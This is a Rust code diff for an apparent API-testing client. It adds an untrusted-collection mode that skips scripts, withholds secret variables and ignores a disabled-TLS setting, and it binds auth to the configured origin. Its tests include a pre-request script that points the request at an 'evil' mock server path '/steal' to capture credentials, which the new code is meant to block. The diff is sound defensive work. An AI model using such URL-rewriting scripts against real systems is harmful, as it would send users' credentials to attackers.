@@ -47,6 +47,10 @@ pub struct HttpSendPayload {
     pub collection_vars: Vec<Variable>,
     #[serde(default)]
     pub global_vars: Vec<Variable>,
+    /// The request comes from an untrusted (imported / pulled) collection: no scripts run and
+    /// Secret environment/global variables are withheld.
+    #[serde(default)]
+    pub untrusted: bool,
 }
 
 /// What `http:send` returns to the renderer (not `NexusResponse`: no raw body bytes, plus script output).
@@ -89,6 +93,26 @@ pub async fn execute(
     payload: HttpSendPayload,
     sandbox: ScriptSandbox,
 ) -> Result<HttpSendResponse, String> {
+    let mut payload = payload;
+    let mut script_logs: Vec<LogEntry> = Vec::new();
+    if payload.untrusted {
+        let withheld = crate::trust::secret_count(&payload.environment_vars)
+            + crate::trust::secret_count(&payload.global_vars);
+        payload.environment_vars = crate::trust::without_secrets(&payload.environment_vars);
+        payload.global_vars = crate::trust::without_secrets(&payload.global_vars);
+        payload.pre_request_script = None;
+        payload.post_response_script = None;
+        if let Some(st) = payload.settings.as_mut() {
+            if crate::trust::restore_tls_verification(st) {
+                script_logs.push(crate::trust::warning(
+                    "Untrusted collection: the request's \"skip TLS verification\" setting was ignored.",
+                ));
+            }
+        }
+        script_logs.push(crate::trust::warning(format!(
+            "Untrusted collection: scripts skipped, {withheld} secret variable(s) withheld (unresolved {{{{vars}}}} stay as-is). Trust the collection to enable them."
+        )));
+    }
     let variable_store = VariableStore::new(&VariableScopes {
         global: payload.global_vars.clone(),
         collection: payload.collection_vars.clone(),
@@ -116,7 +140,8 @@ pub async fn execute(
         )
     };
 
-    let mut script_logs: Vec<LogEntry> = Vec::new();
+    // Auth is bound to the origin as configured (variables resolved, scripts not yet run).
+    let configured_url = request_url.clone();
 
     if let Some(script) = payload
         .pre_request_script
@@ -170,8 +195,20 @@ pub async fn execute(
         Some(b) => Some(SendBody::Bytes(b)),
         None => request_body.clone().map(SendBody::Text),
     };
+    if payload
+        .settings
+        .as_ref()
+        .is_some_and(|s| s.reject_unauthorized == Some(false))
+    {
+        script_logs.push(crate::trust::warning(
+            "TLS certificate verification is DISABLED for this request.",
+        ));
+    }
+    let (auth, origin_warning) =
+        crate::trust::bind_auth_to_origin(payload.auth.as_ref(), &configured_url, &request_url);
+    script_logs.extend(origin_warning);
     let sent = send_authenticated_body(
-        payload.auth.as_ref(),
+        auth,
         request_method,
         request_url,
         request_headers,
@@ -302,6 +339,89 @@ mod tests {
         assert!(v.get("visualizerHtml").is_none());
         assert_eq!(v["timing"]["dns"], 0.0);
         assert!(v["headers"]["content-length"].is_string());
+    }
+
+    /// Payload whose URL a pre-request script sends to `evil`, with api-key auth configured.
+    fn redirecting(good: &MockServer, evil: &MockServer, script: String) -> Value {
+        let _ = evil;
+        json!({
+            "method": "GET",
+            "url": format!("{}/a", good.uri()),
+            "auth": {"type": "api-key", "key": "k", "value": "v", "addTo": "query"},
+            "preRequestScript": script,
+        })
+    }
+
+    #[tokio::test]
+    async fn origin_change_by_script_drops_auth_and_warns() {
+        let (good, evil) = (server().await, server().await);
+        let script = format!("nx.request.url = '{}/steal';", evil.uri());
+        let res = run(payload(redirecting(&good, &evil, script)))
+            .await
+            .unwrap();
+        let req = evil.received_requests().await.unwrap().pop().unwrap();
+        assert_eq!(req.url.path(), "/steal");
+        assert_eq!(req.url.query(), None, "auth must not follow the script");
+        let logs = serde_json::to_string(&res.script_logs).unwrap();
+        assert!(logs.contains("Auth not sent"), "{logs}");
+    }
+
+    #[tokio::test]
+    async fn same_origin_script_change_keeps_auth() {
+        let (good, evil) = (server().await, server().await);
+        let script = format!("nx.request.url = '{}/other';", good.uri());
+        let res = run(payload(redirecting(&good, &evil, script)))
+            .await
+            .unwrap();
+        let req = good.received_requests().await.unwrap().pop().unwrap();
+        assert_eq!(req.url.path(), "/other");
+        assert_eq!(req.url.query(), Some("k=v"));
+        assert!(res.script_logs.is_empty());
+    }
+
+    fn secret_payload(s: &MockServer, untrusted: bool) -> HttpSendPayload {
+        payload(json!({
+            "method": "GET",
+            "url": format!("{}/a", s.uri()),
+            "headers": {"X-Tok": "{{tok}}", "X-N": "{{n}}"},
+            "preRequestScript": "nx.request.headers['X-Script'] = 'ran';",
+            "environmentVars": [
+                {"key": "tok", "value": "S3CRET", "type": "secret", "enabled": true},
+                var("n", "1"),
+            ],
+            "untrusted": untrusted,
+        }))
+    }
+
+    #[tokio::test]
+    async fn untrusted_skips_scripts_and_withholds_secrets() {
+        let s = server().await;
+        let res = run(secret_payload(&s, true)).await.unwrap();
+        let req = s.received_requests().await.unwrap().pop().unwrap();
+        assert_eq!(
+            req.headers.get("x-tok").unwrap().to_str().unwrap(),
+            "{{tok}}"
+        );
+        assert_eq!(req.headers.get("x-n").unwrap().to_str().unwrap(), "1");
+        assert!(req.headers.get("x-script").is_none());
+        assert!(serde_json::to_string(&res.script_logs)
+            .unwrap()
+            .contains("Untrusted"));
+    }
+
+    #[tokio::test]
+    async fn trusted_runs_scripts_and_resolves_secrets() {
+        let s = server().await;
+        run(secret_payload(&s, false)).await.unwrap();
+        let req = s.received_requests().await.unwrap().pop().unwrap();
+        assert_eq!(
+            req.headers.get("x-tok").unwrap().to_str().unwrap(),
+            "S3CRET"
+        );
+        assert_eq!(
+            req.headers.get("x-script").unwrap().to_str().unwrap(),
+            "ran"
+        );
     }
 
     #[tokio::test]
